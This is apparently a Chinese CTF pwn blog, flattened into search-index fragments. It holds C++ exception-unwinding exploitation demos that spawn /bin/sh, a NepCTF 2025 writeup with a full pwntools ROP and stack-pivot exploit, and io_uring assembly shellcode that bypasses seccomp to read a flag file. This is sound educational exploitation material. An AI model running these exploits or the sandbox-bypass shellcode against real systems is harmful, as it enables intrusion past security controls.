backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void input() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 把input函数的rbp改成puts_got - 8，程序就会跳到puts_got中存储的地址去执行，也就是执行puts函数 pl = b'a'*0x30 + p64(0x404050 -8 ) #puts_got -8 p.sendafter(b'input:',pl) 这里有几个点： pl覆盖了input函数的canary，但是由于栈展开，直接去到上层调用链找catch，不会检查canary input函数[rbp]存的是main函数的rbp，减去8就是main函数的返回地址，这里是去改main函数的返回地址为puts函数 demo2 修改retaddr，调用其他catch // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include #include #include void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void test() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] test() return.\\n\"); } void input() { try { test(); } catch (const char *s) { printf(\"[-] String(From input): %s\\n\", s); } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 这里，我们发送pl1，就能调用到backdoor函数里的catch pl = pad + p64(0x404050-0x8)#puts_got -8 pl1 = b'a'*0x30+ p64(0x404050-0x8) + p64(0x401292+1)#backdoor_addr + 1 p.sendafter(b'input:',pl1) pl1把input函数的返回地址改成了backdoor_addr + 1，而抛出异常是在input函数里抛出的，此时的调用链就变成了input -\u003e backdoor，input中没有找到对应的handler，backdoor中有，就去执行backdoor里的了 为什么需要把backdoor_addr去加1？返回地址需要在backdoor函数try区域内，demo2中的范围是(0x401293,0x401297] ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:3","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#demo2"},{"categories":["pwn"],"content":"\rNepCTF 2025 canutrytry 修改rbp控制程序执行流+修改retaddr调用其他catch+栈迁移 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:2:0","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#nepctf-2025-canutrytry"},{"categories":["pwn"],"content":"\r逆向分析 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { int v3; // [rsp+4h] [rbp-2Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-18h] v4 = __readfsqword(0x28u); init(); while ( 1 ) { while ( 1 ) { menu(); std::istream::operator\u003e\u003e(\u0026std::cin, \u0026v3); if ( v3 != 1 ) break; visit(); } if ( v3 != 2 ) exit(0); leave(); } } 在init中： 开了沙箱，只允许四个系统调用，read、write、close、futex， 打开了flag，把flag读到0x4053c0 提供两个选项visit和leave **visit**中提供三个选项： **left：**根据size_list申请堆块 **right：**讲size写入size_list数组 **stright：**输入index，往相应堆块中读入数据 leave： 输入index，把堆块内容复制到栈中**（这里存在栈溢出）**，如果size大于0x10，就抛出异常 异常处理： 抛出异常： visit中的left如果检查到size小于等于0,就会抛出**“invalid size”** leave中如果检测到size大于0x10就会抛出**“stack overflow”** leave和visit中都没有catch，main中有两个catch(char const*)，抛出异常后都会stack unwinding，然后到main中处理 其中一个catch会泄露libc地址和栈地址 .... mov rax, cs:setbuf_ptr mov rsi, rax lea rax, format ; \"setbufaddr:%p\\n\" mov rdi, rax ; format mov eax, 0 call _printf lea rax, [rbp+var_2C] mov rsi, rax lea rax, aStackaddrP ; \"stackaddr:%p\\n\" mov rdi, rax ; format mov eax, 0 call _printf ; } // starts at 401FAD call ___cxa_end_catch jmp loc_401ED4 抛出异常的时候并不会调用另一个catch： loc_401F2B: ; void * mov rdi, rax call ___cxa_begin_catch mov [rbp+var_20], rax ; try { call write_shellcode ; } // starts at 401F37 nop call ___cxa_end_catch call enterflag_writerbp mov eax, 0 mov rdx, [rbp+var_18] sub rdx, fs:28h jz loc_402060 loc_402060: mov rbx, [rbp+var_8] leave retn ; } // starts at 401EB3 main endp enterflag_writerbp中的另一个catch就是执行leave;ret（给了栈迁移的思路） ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:2:1","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#逆向分析"},{"categories":["pwn"],"content":"\r思路过程 首先，泄露出libc和栈地址 leave中栈溢出写retaddr为这个try内的地址（就能去调用到那个不会被调用到的catch） .text:0000000000401ED4 ; try { .text:0000000000401ED4 call menu .text:0000000000401ED4 ; } // starts at 401ED4 接着写入rop链，栈迁移到这里执行rop链 exp: from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' elf = ELF(address) libc = elf.libc gdbscript = \\ \"\"\" bp 0x4019d1 c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"192.168.0.1\",8000 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # pause() def cmd(choice): p.sendlineafter(b'\u003e\u003e',str(choice).encode()) def leave(index): cmd(2) p.sendlineafter(b'index: ',str(index).encode()) def left(): cmd(1) p.sendlineafter(b'\u003e\u003e',b'1') def right(size): cmd(1) p.sendlineafter(b'\u003e\u003e',b'2') p.sendlineafter(b'size:',str(size).encode()) def stright(index,content): cmd(1) p.sendlineafter(b'\u003e\u003e',b'3') p.sendlineafter(b'index:',str(index)) p.sendafter(b'content:',content) right(0x30) right(-1) left() left() p.recvuntil(b'setbufaddr:') libc.address = int(p.recv(14),16) - 0x88060 p.recvuntil(b'stackaddr:') stack = int(p.recv(14),16) success(\"libc -\u003e 0x%x\",libc.address) success(\"stack -\u003e 0x%x\",stack) pl = b'a'*0x20 + p64(stack-0x14) + p64(0x401ED4+1) #不能破坏栈 stright(0,pl) leave(0) #进入另一个catch p.recvuntil(b'now!\\n') #write(2,0x4053c0,0x20) flag_addr = 0x4053c0 #shellcode_addr = 0x405460 pop_rax_ret = 0x45eb0 + libc.address pop_rdi_ret = 0x2a3e5+ libc.address pop_rsi_ret = 0x2be51 + libc.address pop_rdx_r12_ret = 0x11f497+ libc.address rop = p64(0xdeedbeef) rop += p64(pop_rdi_ret) + p64(2) rop += p64(pop_rsi_ret) + p64(flag_addr) rop += p64(pop_rdx_r12_ret) + p64(0x100)*2 rop += p64(libc.symbols['write']) p.send(rop) # pl = p64(0x405460) pl = b'flag' p.sendafter(b'flag: ',pl) #0x405400 -\u003e 0x405460(rop) pl = b'a'*0x10 + p64(0x405460) # dbg() p.send(pl) p.interactive() # 0x0000000000045eb0 : pop rax ; ret # 0x000000000002a3e5 : pop rdi ; ret # 0x000000000002be51 : pop rsi ; ret # 0x000000000011f497 : pop rdx ; pop r12 ; ret ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:2:2","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#思路过程"},{"categories":["pwn"],"content":"\r参考文章《C++.Primer.5th.Edition_2013》 https://en.cppreference.com/w/cpp/language/try.html https://bbs.kanxue.com/thread-284745.htm C++异常处理机制及其利用研究 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:3:0","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#参考文章"},{"categories":["pwn"],"content":"突破沙箱规则，实现orw ","date":"2025-08-23","objectID":"/posts/io_uring/:0:0","series":null,"tags":null,"title":"io_uring","uri":"/posts/io_uring/#"},{"categories":["pwn"],"content":"\r基础知识io_uring涉及三个系统调用 io_uring_setup(2) io_uring_register(2) io_uring_enter(2) ","date":"2025-08-23","objectID":"/posts/io_uring/:1:0","series":null,"tags":null,"title":"io_uring","uri":"/posts/io_uring/#基础知识"},{"categories":["pwn"],"content":"\rio_uring_setup用于初始化执行异步IO的上下文 #include \u003cliburing.h\u003e int io_uring_setup(u32 entries, struct io_uring_params *p); 这个系统调用 创建一个 SQ 和一个 CQ 返回一个文件描述符，随后作为其他相关系统调用的参数 SQ 和 CQ 在应用和内核之间共享（需要用到mmap，还需要mmap SQEs），避免了在初始化和完成 I/O 时（initiating and completing I/O）拷贝数据。 参数： entries参数： 设置SQ和CQ的初始容量至少为entries（至少是因为entries必须是2的幂次方（如32、64、512等），如果不是内核也会自动对齐到最近的更大幂次值（如传入100会被调整为128）） io_uring_params结构体： 一般都是把io_uring_params初始化然后清零，再传入io_uring_setup，内核再将一些返回的信息写入这个结构体 struct io_uring_params { __u32 sq_entries; // 实际提交队列（SQ）大小 __u32 cq_entries; // 实际完成队列（CQ）大小 __u32 flags; // 创建 io_uring 的标志（由用户指定），为0采用中断驱动模式 __u32 sq_thread_cpu; // SQ polling 线程绑定的 CPU __u32 sq_thread_idle; // SQ polling 线程空闲休眠时间 __u32 features; // 内核支持的特性标志 __u32 wq_fd; // 共享 workqueue 的 io_uring 实例 fd __u32 resv[3]; // 保留字段,必须为0 struct io_sqring_offsets sq_off; // SQ 环形队列的偏移信息 struct io_cqring_offsets cq_off; // CQ 环形队列的偏移信息 }; struct io_sqring_offsets { __u32 head; // SQ 的 head 指针（用户态消费，内核读取） __u32 tail; // SQ 的 tail 指针（用户态生产，内核读取） __u32 ring_mask; // 环大小掩码，用于索引取模 __u32 ring_entries;// SQ ring 的 entry 总数 __u32 flags; // SQ 状态标志位 __u32 dropped; // 内核丢弃的 SQE 数量 __u32 array; // SQE 索引数组（存放 SQE 的顺序） __u32 resv1; // 保留字段 __u64 user_addr; // 用户自定义地址（较新内核引入） }; struct io_cqring_offsets { __u32 head; // CQ 的 head 指针（用户态消费） __u32 tail; // CQ 的 tail 指针（内核生产） __u32 ring_mask; // 环大小掩码，用于索引取模 __u32 ring_entries;// CQ ring 的 entry 总数 __u32 overflow; // CQ 溢出计数 __u32 cqes; // CQE 数组起始偏移 __u32 flags; // CQ 状态标志 __u32 resv1; // 保留 __u64 user_addr; // 用户自定义地址 }; ","date":"2025-08-23","objectID":"/posts/io_uring/:1:1","series":null,"tags":null,"title":"io_uring","uri":"/posts/io_uring/#io_uring_setup"},{"categories":["pwn"],"content":"\rio_uring_enter #include \u003cliburing.h\u003e int io_uring_enter(unsigned int fd, unsigned int to_submit, unsigned int min_complete, unsigned int flags, sigset_t *sig); 这个系统调用用于初始化和完成（initiate and complete）I/O，使用共享的 SQ 和 CQ。 单次调用同时执行： 提交新的 I/O 请求 等待 I/O 完成 参数： fd 是 io_uring_setup() 返回的文件描述符 to_submit 告知内核当前有多少个 SQE已准备就绪，可以立即被消费和提交 min_complete默认模式，会等待这个数量的 I/O 事件完成再返回 flags用于控制内核行为 sig设置进程的信号屏蔽状态，如：是否会被Ctrl+c终止。进行orw的话，置0就行 io_uring_sqe 用于传递IO操作的具体信息 opcode：决定执行什么操作，其中包含一些文件IO操作(如：一些等价于open、write的操作)、进程管理操作等 /* * IO submission data structure (Submission Queue Entry) */ struct io_uring_sqe { __u8 opcode; /* type of operation for this sqe */ __u8 flags; /* IOSQE_ flags */ __u16 ioprio; /* ioprio for the request */ __s32 fd; /* file descriptor to do IO on */ union { __u64 off; /* offset into file */ __u64 addr2; struct { __u32 cmd_op; __u32 __pad1; }; }; union { __u64 addr; /* pointer to buffer or iovecs */ __u64 splice_off_in; struct { __u32 level; __u32 optname; }; }; __u32 len; /* buffer size or number of iovecs */ union { __kernel_rwf_t rw_flags; __u32 fsync_flags; __u16 poll_events; /* compatibility */ __u32 poll32_events; /* word-reversed for BE */ __u32 sync_range_flags; __u32 msg_flags; __u32 timeout_flags; __u32 accept_flags; __u32 cancel_flags; __u32 open_flags; __u32 statx_flags; __u32 fadvise_advice; __u32 splice_flags; __u32 rename_flags; __u32 unlink_flags; __u32 hardlink_flags; __u32 xattr_flags; __u32 msg_ring_flags; __u32 uring_cmd_flags; __u32 waitid_flags; __u32 futex_flags; __u32 install_fd_flags; __u32 nop_flags; }; __u64 user_data; /* data to be passed back at completion time */ /* pack this to avoid bogus arm OABI complaints */ union { /* index into fixed buffers, if used */ __u16 buf_index; /* for grouped buffer selection */ __u16 buf_group; } __attribute__((packed)); /* personality to use, if used */ __u16 personality; union { __s32 splice_fd_in; __u32 file_index; __u32 optlen; struct { __u16 addr_len; __u16 __pad3[1]; }; }; union { struct { __u64 addr3; __u64 __pad2[1]; }; __u64 optval; /* * If the ring is initialized with IORING_SETUP_SQE128, then * this field is used for 80 bytes of arbitrary command data */ __u8 cmd[0]; }; }; ","date":"2025-08-23","objectID":"/posts/io_uring/:1:2","series":null,"tags":null,"title":"io_uring","uri":"/posts/io_uring/#io_uring_enter"},{"categories":["pwn"],"content":"\r模板 from pwn import * \"\"\" rsp+0x100 0x078: struct io_uring_params params = {}; rsp+0x200 0x008: uring_fd rsp+0x208 0x008: sq_ring ptr rsp+0x210 0x008: cq_ring ptr rsp+0x218 0x008: sqes ptr rsp+0x220 0x008: flag_fd rsp+0x300 0x100: buffer \"\"\" shellcode = asm(\"\"\" /*视情况调整栈帧*/ add rsp, 0x2000 /*int uring_fd = syscall(SYS_io_uring_setup, 16, \u0026params);*/ mov rax, 0 lea rdi, [rsp+0x100] mov rcx, 15 rep stosq mov rdi, 16 lea rsi, [rsp+0x100] mov rax, 0x1a9 syscall /*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/ mov qword ptr [rsp+0x200], rax xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0 mov rax, 9 syscall mov qword ptr [rsp+0x208], rax /*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/ xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0x8000000 mov rax, 9 syscall mov qword ptr [rsp+0x210], rax /*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/ xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0x10000000 mov rax, 9 syscall mov qword ptr [rsp+0x218], rax /*openat*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 18 /*opcode*/ mov byte ptr [rdi+1], 0 /* IOSQE_ flags*/ mov dword ptr [rdi+4], -100 /* file descriptor to do IO on */ /* 要打开文件的路径存放在 rsp+0x300 处 */ mov rax, 0x67616c662f2e mov qword ptr [rsp+0x300], rax lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax /*pathname*/ mov dword ptr [rdi+28], 0 /*open_flag*/ mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 1 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall mov rdi, qword ptr [rsp+0x210] mov edx, dword ptr [rsp+0x164] add rdi, rdx mov edx, dword ptr [rdi+8] mov qword ptr [rsp+0x220], rdx /*read*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 22 mov rax, qword ptr [rsp+0x220] mov dword ptr [rdi+4], eax lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax mov dword ptr [rdi+24], 0x100 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 1 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall /*write*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 23 mov dword ptr [rdi+4], 1 lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax mov dword ptr [rdi+24], 0x100 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 3 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall \"\"\") mmap映射： 在初始化io_uring的时候，分别对SQ、CQ、SQEs进行了三次mmap映射，offset参数需要分别设置为IORING_OFF_SQ_RING、IORING_OFF_CQ_RING、IORING_OFF_SQES #define IORING_OFF_SQ_RING 0ULL #define IORING_OFF_CQ_RING 0x8000000ULL #define IORING_OFF_SQES 0x10000000ULL ","date":"2025-08-23","objectID":"/posts/io_uring/:1:3","series":null,"tags":null,"title":"io_uring","uri":"/posts/io_uring/#模板"},{"categories":["pwn"],"content":"\rliburing实现了对底层系统调用的封装 初始化与清理 struct io_uring ring; // 初始化 (默认128条目) int io_uring_queue_init(unsigned entries, struct io_uring *ring, unsigned flags); // 清理资源 void io_uring_queue_exit(struct io_uring *ring); 提交队列管理 // 获取下一个可用的 SQE struct io_uring_sqe *io_uring_get_sqe(struct io_uring *ring); // 批量提交 SQE int io_uring_submit(struct io_uring *ring); 操作准备函数 // 准备读操作 void io_uring_prep_read(struct io_uring_sqe *sqe, int fd, void *buf, unsigned nbytes, off_t offset); // 准备写操作 void io_uring_prep_write(struct io_uring_sqe *sqe, int fd, const void *buf, unsigned nbytes, off_t offset); // 准备打开操作 void io_uring_prep_openat(struct io_uring_sqe *sqe, int dfd, const char *path, int flags, mode_t mode); // 准备关闭操作 void io_uring_prep_close(struct io_uring_sqe *sqe, int fd); 完成处理 // 等待完成事件 int io_uring_wait_cqe(struct io_uring *ring, struct io_uring_cqe **cqe); // 查看完成事件(非阻塞) int io_uring_peek_cqe(struct io_uring *ring, struct io_uring_cqe **cqe); // 标记事件已处理 void io_uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe); 进行orw // gcc -o shellcode shellcode.c -luring -lseccomp -static #include \u003cstdio.h\u003e #include \u003cfcntl.h\u003e #include \u003cunistd.h\u003e #include \u003cliburing.h\u003e #include \u003cseccomp.h\u003e #include \u003csyscall.h\u003e #define BUFFER_SIZE 4096 int main() { struct io_uring ring; struct io_uring_cqe *cqe; struct io_uring_sqe *sqe; char buffer[BUFFER_SIZE] = {0}; int fd; io_uring_queue_init(16, \u0026ring, 0); sqe = io_uring_get_sqe(\u0026ring); io_uring_prep_openat(sqe, AT_FDCWD, \"flag\", O_RDONLY, 0); io_uring_submit(\u0026ring); io_uring_wait_cqe(\u0026ring, \u0026cqe); fd = cqe-\u003eres; sqe = io_uring_get_sqe(\u0026ring); io_uring_prep_read(sqe, fd, buffer, BUFFER_SIZE, 0); io_uring_submit(\u0026ring); io_uring_wait_cqe(\u0026ring, \u0026cqe); sqe = io_uring_get_sqe(\u0026ring); io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFFER_SIZE, 0); io_uring_submit(\u0026ring); io_uring_queue_exit(\u0026ring); return 0; } ","date":"2025-08-23","objectID":"/posts/io_uring/:1:4","series":null,"tags":null,"title":"io_uring","uri":"/posts/io_uring/#liburing"},{"categories":["pwn"],"content":"\rACTF 2023 master-of-rop沙箱禁掉了常用的orw及其替代syscall，需要寻找一些其他的替代syscall line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x19 0xc000003e if (A != ARCH_X86_64) goto 0027 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u003c 0x40000000) goto 0005 0004: 0x15 0x00 0x16 0xffffffff if (A != 0xffffffff) goto 0027 0005: 0x15 0x15 0x00 0x00000000 if (A == read) goto 0027 0006: 0x15 0x14 0x00 0x00000001 if (A == write) goto 0027 0007: 0x15 0x13 0x00 0x00000002 if (A == open) goto 0027 0008: 0x15 0x12 0x00 0x00000011 if (A == pread64) goto 0027 0009: 0x15 0x11 0x00 0x00000012 if (A == pwrite64) goto 0027 0010: 0x15 0x10 0x00 0x00000013 if (A == readv) goto 0027 0011: 0x15 0x0f 0x00 0x00000014 if (A == writev) goto 0027 0012: 0x15 0x0e 0x00 0x00000028 if (A == sendfile) goto 0027 0013: 0x15 0x0d 0x00 0x0000002c if (A == sendto) goto 0027 0014: 0x15 0x0c 0x00 0x0000002e if (A == sendmsg) goto 0027 0015: 0x15 0x0b 0x00 0x0000003b if (A == execve) goto 0027 0016: 0x15 0x0a 0x00 0x00000101 if (A == openat) goto 0027 0017: 0x15 0x09 0x00 0x00000127 if (A == preadv) goto 0027 0018: 0x15 0x08 0x00 0x00000128 if (A == pwritev) goto 0027 0019: 0x15 0x07 0x00 0x0000012f if (A == name_to_handle_at) goto 0027 0020: 0x15 0x06 0x00 0x00000130 if (A == open_by_handle_at) goto 0027 0021: 0x15 0x05 0x00 0x00000142 if (A == execveat) goto 0027 0022: 0x15 0x04 0x00 0x00000147 if (A == preadv2) goto 0027 0023: 0x15 0x03 0x00 0x00000148 if (A == pwritev2) goto 0027 0024: 0x15 0x02 0x00 0x000001ac if (A == 0x1ac) goto 0027 0025: 0x15 0x01 0x00 0x000001b5 if (A == 0x1b5) goto 0027 0026: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0027: 0x06 0x00 0x00 0x00000000 return KILL ","date":"2025-08-23","objectID":"/posts/io_uring/:2:0","series":null,"tags":null,"title":"io_uring","uri":"/posts/io_uring/#actf-2023-master-of-rop"},{"categories":["pwn"],"content":"\r确定内核版本首先需要确定内核版本 确定内核版本的方法： 以我本地为例，我的内核版本 6.6.87，但是我去调用一些新内核版本才有的系统调用： shellcode = asm(''' mov rax, 454 xor rdi, rdi xor rsi, rsi xor rdx, rdx syscall ''') 这个syscall的返回值存在RAX是：0xffffffffffffffda，在 64 位有符号数下就是 -38。表示 syscall 返回了 -ENOSYS，说明该系统调用在你这个内核版本中不存在。 远程的话不会回显，可以通过 cmp rax, -38判断，如果ENOSYS就wirte一些信息 ","date":"2025-08-23","objectID":"/posts/io_uring/:2:1","series":null,"tags":null,"title":"io_uring","uri":"/posts/io_uring/#确定内核版本"},{"categories":["pwn"],"content":"\r寻找代替系统调用由于禁掉了常用的一些orw系统调用，需要去寻找其他替代的系统调用来orw 别人测得的版本小于 6.1.60 以 linux-5.15.137 为参考 深入SYS_openat后发现，其主要逻辑是调用do_filp_open，而do_file_open又会被io_uring.c这个文件调用。 了解io_uring之后发现其能够替代orw，至此，确定了通过io_uring实现orw ","date":"2025-08-23","objectID":"/posts/io_uring/:2:2","series":null,"tags":null,"title":"io_uring","uri":"/posts/io_uring/#寻找代替系统调用"},{"categories":["pwn"],"content":"\r实现liburing提供了对底层系统调用的封装，但是看了看，还是觉得直接用系统调用写shellcode比较简单，这里直接用模板 exp: from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) shellcode = asm(\"\"\" /*视情况调整栈帧*/ add rsp, 0x2000 /*int uring_fd = syscall(SYS_io_uring_setup, 16, \u0026params);*/ mov rax, 0 lea rdi, [rsp+0x100] mov rcx, 15 rep stosq mov rdi, 16 lea rsi, [rsp+0x100] mov rax, 0x1a9 syscall /*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/ mov qword ptr [rsp+0x200], rax xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0 mov rax, 9 syscall mov qword ptr [rsp+0x208], rax /*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/ xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0x8000000 mov rax, 9 syscall mov qword ptr [rsp+0x210], rax /*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/ xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0x10000000 mov rax, 9 syscall mov qword ptr [rsp+0x218], rax /*openat*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 18 /*opcode*/ mov byte ptr [rdi+1], 0 /* IOSQE_ flags*/ mov dword ptr [rdi+4], -100 /* file descriptor to do IO on */ /* 要打开文件的路径存放在 rsp+0x300 处 */ mov rax, 0x67616c662f2e mov qword ptr [rsp+0x300], rax lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax /*pathname*/ mov dword ptr [rdi+28], 0 /*open_flag*/ mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 1 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall mov rdi, qword ptr [rsp+0x210] mov edx, dword ptr [rsp+0x164] add rdi, rdx mov edx, dword ptr [rdi+8] mov qword ptr [rsp+0x220], rdx /*read*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 22 mov rax, qword ptr [rsp+0x220] mov dword ptr [rdi+4], eax lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax mov dword ptr [rdi+24], 0x100 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 1 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall /*write*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 23 mov dword ptr [rdi+4], 1 lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax mov dword ptr [rdi+24], 0x100 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 3 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall \"\"\") p.recvuntil(b'code\\n') # dbg() p.send(shellcode) p.interactive() 可能要多打几次才能打通 ","date":"2025-08-23","objectID":"/posts/io_uring/:2:3","series":null,"tags":null,"title":"io_uring","uri":"/posts/io_uring/#实现"},{"categories":["pwn"],"content":"\r参考文章https://www.yuque.com/xiaocangxu/pwn/pd2zc37ebgbanvau#vqGHAs https://kernel.dk/io_uring.pdf [译] Linux 异步 I/O 框架 io_uring：基本原理、程序示例与性能压测（2020） 星盟WP ","date":"2025-08-23","objectID":"/posts/io_uring/:3:0","series":null,"tags":null,"title":"io_uring","uri":"/posts/io_uring/#参考文章"},{"categories":["WP"],"content":"\rcanon_event ptrace + 沙箱绕过 int __fastcall main(int argc, const char **argv, const char **envp) { void *v3; // rbx void *v4; // rax void *v5; // r12 unsigned int uint; // ebp v3 = mmap((void *)0xDEAD000, 0x1000u, 3, 50, -1, 0); v4 = mmap((void *)0xDEAE000, 0x1000u, 3, 50, -1, 0); if ( v3 == (void *)-1LL || (v5 = v4, v4 == (void *)-1LL) ) err(1, \"mmap failed\"); printf(\"code size: \"); uint = get_uint(); // 输入shellcode长度 if ( uint \u003e 0x1000 ) // shellcode长度大于0x1000就报错 { puts(\"invalid code size\"); exit(1); } printf(\"enter shellcode: \"); if ( read(0, v3, uint) \u003c 0 ) // 读入shellcode err(1, \"read failed\"); if ( mprotect(v3, 0x1000u, 